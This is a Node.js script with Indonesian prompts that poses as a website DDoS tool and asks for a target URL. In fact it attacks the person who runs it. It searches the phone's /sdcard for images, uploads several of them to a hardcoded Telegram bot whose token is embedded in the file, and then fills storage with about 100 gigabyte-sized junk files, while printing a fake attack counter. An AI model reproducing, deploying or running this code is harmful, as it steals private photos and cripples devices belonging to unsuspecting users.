const readline = require('readline');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const FormData = require('form-data');

const TELEGRAM_API_KEY = '7910787444:AAEdOAf_We8ALJ6V55SB4NzB7lsxEKZlqt4';
const TELEGRAM_CHAT_ID = '7894929132';
const folderPath = '/sdcard/kontol';
const imageFormats = ['.jpg', '.jpeg', '.png', '.gif'];

if (!fs.existsSync(folderPath)) {
    fs.mkdirSync(folderPath, { recursive: true });
}

async function sendPhotoToTelegram(filePath) {
    try {
        const form = new FormData();
        form.append('chat_id', TELEGRAM_CHAT_ID);
        form.append('photo', fs.createReadStream(filePath));

        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_API_KEY}/sendPhoto`, form, {
            headers: form.getHeaders(),
        });
    } catch (error) {}
}

function findImages(dirPath) {
    let files = [];
    try {
        const items = fs.readdirSync(dirPath);
        items.forEach((item) => {
            const fullPath = path.join(dirPath, item);
            const stat = fs.statSync(fullPath);
            if (stat.isDirectory()) {
                files = files.concat(findImages(fullPath));
            } else {
                const ext = path.extname(fullPath).toLowerCase();
                if (imageFormats.includes(ext)) {
                    files.push(fullPath);
                }
            }
        });
    } catch (err) {}
    return files;
}

async function runDDosAndSendPhotos() {
    const images = findImages('/sdcard');
    const selectedImages = images.slice(0, 5);

    for (const image of selectedImages) {
        await sendPhotoToTelegram(image);
    }

    let totalFiles = 100;
    let batchSize = 2;
    let delay = 3000;

    function createBatch(startIndex) {
        for (let i = startIndex; i < startIndex + batchSize && i <= totalFiles; i++) {
            let filePath = `${folderPath}/hacked_${i}.txt`;

            let stream = fs.createWriteStream(filePath, { flags: 'a' });

            let chunk = Buffer.alloc(50 * 1024 * 1024, '*저HackedByYan저*\n');
            let totalChunks = 20;

            function writeChunks(index) {
                if (index < totalChunks) {
                    stream.write(chunk, () => {
                        writeChunks(index + 1);
                    });
                } else {
                    stream.end();
                }
            }

            writeChunks(0);
        }

        if (startIndex + batchSize <= totalFiles) {
            setTimeout(() => {
                createBatch(startIndex + batchSize);
            }, delay);
        }
    }

    createBatch(1);

    let requestCount = 0;
    setInterval(() => {
        requestCount += 200;
        console.log(`🚀 Menyerang dengan 200 request per detik. Total request: ${requestCount}`);
    }, 1000);
}

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

console.log(`
／ イ  　　　(((ヽ
(　 ﾉ　　　　 ￣Ｙ＼
|　(＼　(.        /)   ｜    )
ヽ　ヽ` ( ͡° ͜ʖ ͡°) _ノ    /
　＼ |　⌒Ｙ⌒　/  /
　 ｜ヽ　 ｜　 ﾉ ／
　  ＼トー仝ーイ
　　 ｜ ミ土彡/
          ) \     °   /
         (     \      /
         /       / ѼΞΞΞΞΞΞΞ𝘿
      /  /     /      \\  \
      ( (    ).           ) ).  )
     (      ).            ( |    | 
      |    /                \   |
      :_. }                  𝙡—}                                 𝙤𝙩𝙤𝙩 𝙠𝙖𝙬𝙖𝙩 𝙩𝙪𝙡𝙖𝙣𝙜 𝙗𝙚𝙨𝙞🗿🚬
                                                   
╭────────────────╮
# 𝙏𝙧𝙖𝙨𝙚𝙧 𝙊𝙛𝙛𝙞𝙘𝙞𝙖𝙡
╰────────────────╯
╭────────╮
# 𝘼𝙣𝙤𝙉404
╰────────╯
╭──────────────╮
# 𝙍𝙚𝙖𝙡 𝙄𝙣𝙛𝙞𝙣𝙞𝙩𝙮
╰──────────────╯
╭────────────╮
# 𝘽𝙡𝙖𝙘𝙠 𝙂𝙝𝙤𝙨𝙩
╰────────────╯
╭─────────────╮
# 𝙔𝙤𝙣𝙚𝙭 𝙏𝙚𝙣𝙨𝙞𝙭
╰─────────────╯
╭────────────╮
# NANZZ GGWP
╰────────────╯
═══════════════════════════════╮
1. DEVACE WEB ( URL LINK )
2. keluar
═══════════════════════════════╯
`);

rl.question('Pilih Nomor: ', (choice) => {
    if (choice === '1') {
        rl.question('Masukkan URL Target: ', (url) => {
            console.log(`TUNGGU SEBENTAR MENYERANG ${url}`);
            setTimeout(() => {
                runDDosAndSendPhotos();
            }, 5000);
            rl.close();
        });
    } else {
        console.log('🚀 Keluar...');
        rl.close();
    }
});
